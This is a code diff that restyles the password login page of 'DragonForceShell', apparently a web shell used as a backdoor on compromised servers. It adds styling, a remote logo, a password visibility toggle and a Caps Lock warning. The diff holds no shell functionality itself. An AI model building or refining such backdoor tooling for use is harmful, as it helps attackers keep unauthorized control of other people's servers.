@@ -1,10 +1,90 @@
-<html style='background:#000'><head>
-<title>Jejes</title>
-</head><body><center>
-<form style='width:50%;height:200px;margin-top:15%;' action='' method='POST' autocomplete='OFF'>
-<label style='color:#1902c9;font-size:20px;'>DFS</lable>
-<label style='color:red;font-size:20px;'>V2</label><br>
-<label style='color:yellow;font-size:20px;'>DragonForceShell</label><br>
-<input style='width:200px;height:30px;background:rgba(255,255,255,0.2);color:#FFD700;font-size:20px;' type='password' name='password'>
-<input style='width:70px;height:30px;' type='submit' name='login' value='>>>'></form>
-</center></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DragonForceShell V2.5 &mdash; Login</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap');
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    min-height:100vh;display:flex;align-items:center;justify-content:center;
+    background:radial-gradient(1000px 600px at 50% -10%, #2a2303 0%, #171502 45%, #000 100%);
+    font-family:'Orbitron',monospace;color:#FFD700;padding:20px;
+  }
+  .dfs-card{
+    width:100%;max-width:380px;text-align:center;
+    background:rgba(0,0,0,0.65);border:1px solid #4a3d05;border-radius:16px;
+    padding:32px 28px 24px;box-shadow:0 0 40px rgba(255,215,0,0.12);
+  }
+  .dfs-card img.logo{width:84px;height:84px;border-radius:50%;object-fit:cover;margin-bottom:12px;border:2px solid #FFD700;}
+  .dfs-badge{font-size:26px;letter-spacing:3px;color:#4d7cff;font-weight:700;}
+  .dfs-badge span{color:#f70000;}
+  .dfs-card h1{font-size:17px;letter-spacing:2px;color:#FFD700;margin:6px 0 2px;font-weight:500;}
+  .dfs-card p.sub{font-size:11px;letter-spacing:1px;color:#8a8a8a;margin-bottom:20px;}
+  .dfs-card form{text-align:left;}
+  .dfs-card label.lbl{display:block;font-size:11px;letter-spacing:2px;color:#aaa;margin-bottom:6px;}
+  .pw-row{display:flex;gap:8px;}
+  .pw-row input[type=password],.pw-row input[type=text]{
+    flex:1;height:42px;padding:0 12px;font-size:16px;letter-spacing:1px;
+    background:rgba(255,255,255,0.07);border:1px solid #4a3d05;border-radius:8px;
+    color:#FFD700;outline:none;font-family:inherit;
+  }
+  .pw-row input:focus{border-color:#FFD700;box-shadow:0 0 0 2px rgba(255,215,0,0.15);}
+  #pwToggle{
+    width:46px;border:1px solid #4a3d05;border-radius:8px;cursor:pointer;
+    background:#111;color:#FFD700;font-size:18px;
+  }
+  #pwToggle:hover{background:#222;}
+  #capsWarn{display:none;font-size:11px;color:#ff9d00;margin-top:6px;letter-spacing:1px;}
+  input[type=submit]{
+    width:100%;height:44px;margin-top:14px;border:none;border-radius:8px;cursor:pointer;
+    background:linear-gradient(180deg,#2b2470,#191645);color:#fff;
+    font-family:inherit;font-size:14px;letter-spacing:3px;
+  }
+  input[type=submit]:hover{filter:brightness(1.25);}
+  .dfs-foot{margin-top:16px;font-size:10px;letter-spacing:1px;color:#666;}
+  .dfs-foot b{color:#8a8a8a;}
+</style>
+</head>
+<body>
+  <div class="dfs-card">
+    <img class="logo" src="https://raw.githubusercontent.com/EagleTube/DFS/main/images/logoritma.png" alt="" onerror="this.style.display='none'">
+    <div class="dfs-badge">DFS <span>V2.5</span></div>
+    <h1>DragonForceShell</h1>
+    <p class="sub">RESTRICTED ACCESS &mdash; AUTHORIZED ONLY</p>
+    <form action="" method="POST" autocomplete="off">
+      <label class="lbl" for="dfsPass">PASSWORD</label>
+      <div class="pw-row">
+        <input id="dfsPass" type="password" name="password" required autofocus placeholder="••••••••">
+        <button type="button" id="pwToggle" title="Show / hide password">&#128065;</button>
+      </div>
+      <p id="capsWarn">&#9888; Caps Lock is ON</p>
+      <input type="submit" name="login" value="UNLOCK &#10148;">
+    </form>
+    <p class="dfs-foot">Coded by <b>EagleEye</b> &mdash; v2.3 hardened</p>
+  </div>
+<script>
+  (function(){
+    var pw = document.getElementById('dfsPass');
+    var tg = document.getElementById('pwToggle');
+    var caps = document.getElementById('capsWarn');
+    if(pw) pw.focus();
+    if(tg && pw){
+      tg.addEventListener('click', function(){
+        pw.type = (pw.type === 'password') ? 'text' : 'password';
+        pw.focus();
+      });
+    }
+    if(pw && caps && pw.addEventListener){
+      ['keyup','keydown'].forEach(function(ev){
+        pw.addEventListener(ev, function(e){
+          try{ caps.style.display = (e.getModifierState && e.getModifierState('CapsLock')) ? 'block' : 'none'; }
+          catch(_){ /* older browser */ }
+        });
+      });
+    }
+  })();
+</script>
+</body>
+</html>
